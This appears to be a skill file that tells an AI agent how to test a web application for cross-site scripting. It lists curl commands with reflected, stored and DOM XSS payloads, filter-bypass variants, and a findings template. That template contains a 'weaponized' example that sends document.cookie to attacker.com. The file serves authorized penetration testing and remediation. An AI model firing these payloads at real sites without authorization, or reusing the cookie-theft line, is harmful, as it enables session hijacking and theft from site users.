---
name: blackbox-xss
description: >-
  Actively test a target web application for Cross-Site Scripting (XSS)
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  injects XSS payloads into every identified parameter (reflected, stored, and
  DOM-based), detects successful injection by checking for unescaped payload
  reflection in HTML/JS responses, and writes confirmed findings with PoC
  payloads to pentest/xss-results.md. Use when asked to find XSS in a
  blackbox pentest.
---

# Blackbox XSS Detection

You are actively testing a web application for Cross-Site Scripting vulnerabilities without source code access. You will inject payloads into every identified parameter and analyze responses for unescaped reflection.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## XSS Types

- **Reflected XSS**: Payload injected in a request, immediately reflected in the response HTML
- **Stored XSS**: Payload saved to the database, reflected when a page loads later
- **DOM-based XSS**: Payload is processed by client-side JavaScript (harder to detect via curl)

---

## Phase 1: Identify Injection Points

Read `pentest/target-map.md` and list all string parameters:

1. **Query string params**: `?search=`, `?q=`, `?name=`, `?msg=`, `?redirect=`
2. **POST form fields**: search boxes, comment fields, profile name/bio, message fields
3. **JSON body strings**: any string field in API requests
4. **URL path segments**: `/profile/username`, `/page/title`
5. **HTTP headers**: `Referer`, `User-Agent` (if reflected in error pages or logging)
6. **Cookie values**: preference names, theme values, usernames stored in cookies

Write test candidates to `pentest/xss-recon.md`.

---

## Phase 2: Reflected XSS Testing

### Step 1: Probe for Unescaped Reflection

First, inject a unique marker to see if and where it appears in the response:

```bash
# Use a unique, harmless marker first
curl -sk "<TARGET_URL>/search?q=XSS_PROBE_7x9z"

# Check if it appears in the response body
curl -sk "<TARGET_URL>/search?q=XSS_PROBE_7x9z" | grep -i "XSS_PROBE_7x9z"
```

If the probe appears in the response, determine the context:
- **HTML body context**: `<p>You searched for: XSS_PROBE_7x9z</p>` → inject `<script>` tags
- **HTML attribute context**: `<input value="XSS_PROBE_7x9z">` → inject `"` to break attribute
- **JavaScript context**: `var q = "XSS_PROBE_7x9z"` → inject `"` to break string
- **HTML comment**: `<!-- XSS_PROBE_7x9z -->` → inject `-->` to break out

### Step 2: Context-Appropriate Payloads

**HTML body context:**
```bash
curl -sk "<TARGET_URL>/search?q=<script>alert(1)</script>"
curl -sk "<TARGET_URL>/search?q=<img src=x onerror=alert(1)>"
curl -sk "<TARGET_URL>/search?q=<svg onload=alert(1)>"
curl -sk "<TARGET_URL>/search?q=<body onload=alert(1)>"
```

**HTML attribute context (outside quotes):**
```bash
curl -sk "<TARGET_URL>/search?q=test onmouseover=alert(1)"
curl -sk "<TARGET_URL>/search?q=test autofocus onfocus=alert(1)"
```

**HTML attribute context (inside double quotes):**
```bash
curl -sk "<TARGET_URL>/search?q=\"><script>alert(1)</script>"
curl -sk "<TARGET_URL>/search?q=\"><img src=x onerror=alert(1)>"
curl -sk "<TARGET_URL>/search?q=\" onmouseover=\"alert(1)"
```

**JavaScript context (inside string):**
```bash
curl -sk "<TARGET_URL>/page?id=test\";alert(1)//"
curl -sk "<TARGET_URL>/page?id=test';alert(1)//"
curl -sk "<TARGET_URL>/page?id=test\`${alert(1)}\`"
```

**Check for payload in response:**
```bash
curl -sk "<TARGET_URL>/search?q=<img src=x onerror=alert(1)>" | \
  grep -i "onerror\|<img\|<script"
```

A payload is **confirmed reflected** if it appears unescaped (not as `&lt;` or `&#x3C;`) in the response.

### Step 3: Filter Bypass Payloads

If basic payloads are filtered, try bypass techniques:

```bash
# Case variation
curl -sk "<TARGET_URL>/search?q=<ScRiPt>alert(1)</sCrIpT>"

# Without quotes
curl -sk "<TARGET_URL>/search?q=<img/src=x onerror=alert(1)>"

# HTML entities in attribute events
curl -sk "<TARGET_URL>/search?q=<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>"

# JavaScript protocol in href/src
curl -sk "<TARGET_URL>/search?q=<a href=javascript:alert(1)>click</a>"

# Template literal injection
curl -sk "<TARGET_URL>/search?q=\${alert(1)}"

# URL encoding
curl -sk "<TARGET_URL>/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

# Double encoding
curl -sk "<TARGET_URL>/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Null byte
curl -sk "<TARGET_URL>/search?q=<scri%00pt>alert(1)</scri%00pt>"
```

---

## Phase 3: Stored XSS Testing

Stored XSS requires that you:
1. Submit a payload that gets saved (comment, profile, message)
2. Load the page where it would be displayed

### Step 1: Identify Storage Points

From `target-map.md`, find endpoints that:
- Accept user input and store it (POST /comments, POST /profile, POST /messages)
- Display user-supplied content publicly or to other users

### Step 2: Inject and Retrieve

```bash
# Submit payload to a comment/profile field
curl -sk -X POST "<TARGET_URL>/api/comments" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"content":"<img src=x onerror=alert(document.domain)>","post_id":1}'

# Then retrieve the page that displays comments
curl -sk "<TARGET_URL>/posts/1" | grep -i "onerror\|<img\|<script"
```

**A finding is confirmed stored XSS** if the unescaped payload appears in any page load response.

### Step 3: Profile/Username XSS

```bash
# Update profile with XSS payload
curl -sk -X PUT "<TARGET_URL>/api/me" \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(document.cookie)</script>","bio":"test"}'

# Check if it renders escaped or not on profile view
curl -sk "<TARGET_URL>/api/me" -H "Authorization: Bearer <TOKEN>" | \
  grep -i "alert\|<script"
```

---

## Phase 4: DOM XSS Indicators

DOM XSS executes entirely in the browser and is hard to detect via curl. However, you can identify likely DOM XSS sinks from the JS source:

Check JS files from `target-map.md` for dangerous patterns:
```bash
curl -sk "<TARGET_URL>/app.js" | grep -E \
  "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(|location\.hash|location\.search|document\.URL|window\.location"
```

If you find patterns like:
```javascript
document.getElementById('output').innerHTML = location.search.split('q=')[1]
```

This is a DOM XSS sink. Note it as a likely finding requiring browser confirmation.

---

## Phase 5: Redirect/URL Parameter XSS

```bash
# Open redirect that may enable XSS
curl -sk -D - "<TARGET_URL>/redirect?url=javascript:alert(1)"
curl -sk -D - "<TARGET_URL>/login?next=javascript:alert(1)"
curl -sk -D - "<TARGET_URL>/goto?to=javascript:alert(1)"

# Check if the response contains an unescaped href with the payload
curl -sk "<TARGET_URL>/redirect?url=javascript:alert(1)" | \
  grep -i "href\|location\|redirect"
```

---

## Output Format

Write confirmed findings to `pentest/xss-results.md`:

```markdown
# XSS Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed XSS: [N] (Reflected: X, Stored: Y, DOM: Z)
- Likely XSS: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED REFLECTED XSS] /search - q parameter

- **Endpoint**: `GET /search?q=<payload>`
- **Parameter**: `q` (query string)
- **Context**: HTML body — value reflected directly between `<p>` tags without encoding
- **Impact**: Steal session cookies, perform actions as victim user, redirect to phishing pages, keylog
- **Evidence**: Payload `<img src=x onerror=alert(1)>` appears unencoded in response body
- **PoC**:
  ```bash
  curl -sk "https://target.com/search?q=<img+src%3Dx+onerror%3Dalert(document.domain)>"
  # Look for unescaped: <img src=x onerror=alert(document.domain)>

  # Weaponized (steal cookies — attacker controls attacker.com):
  # https://target.com/search?q=<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
  ```
- **Remediation**: HTML-encode all user input before reflecting it in HTML. Use a templating engine with auto-escaping enabled (e.g. Jinja2, React JSX).

### [CONFIRMED STORED XSS] /api/comments - content field

- **Endpoint**: `POST /api/comments` (storage) → `GET /posts/1` (execution)
- **Parameter**: `content` (JSON body)
- **Impact**: Persistent — executes for every user that views the affected page; can steal admin session if admin views comments
- **Evidence**: Payload `<script>alert(document.domain)</script>` appears unescaped in `GET /posts/1` response
- **PoC**:
  ```bash
  # 1. Store payload
  curl -sk -X POST "https://target.com/api/comments" \
    -H "Authorization: Bearer <YOUR_TOKEN>" \
    -H "Content-Type: application/json" \
    -d '{"content":"<img src=x onerror=alert(document.domain)>","post_id":1}'

  # 2. Retrieve (payload executes in browser)
  curl -sk "https://target.com/posts/1" | grep "onerror"
  ```
- **Remediation**: Sanitize stored HTML using a safe allowlist library (e.g. DOMPurify on output, or server-side with bleach/sanitize-html). Never store raw HTML from users.

### [LIKELY DOM XSS] /products - category parameter

- **Evidence**: `app.js` contains `innerHTML = location.search.split('category=')[1]` — requires browser confirmation
- **Suggestion**: Navigate to `https://target.com/products?category=<img src=x onerror=alert(1)>` in a browser and observe if the payload executes
```

After writing results, delete `pentest/xss-recon.md`.

---

## Important Reminders

- **Reflected XSS proof**: The payload must appear *unescaped* in the response. `&lt;script&gt;` is NOT XSS — it's properly escaped.
- **Stored XSS**: Always note both the storage endpoint AND the retrieval endpoint in your PoC.
- **Context matters**: A `<script>` tag injected inside a JavaScript string won't work. Match your payload to the injection context.
- **Browser confirmation**: curl can detect reflected payloads in HTML, but DOM XSS and some stored XSS require a real browser to confirm execution. Note these as "Likely" and describe the confirmation method.
- If Content-Security-Policy is present, note its value — it may limit exploitability. However, still report the injection as a finding.
- Use `document.domain` in PoC alerts instead of `alert(1)` — it's more convincing and shows the domain.
- Clean up: delete `pentest/xss-recon.md` after writing results.
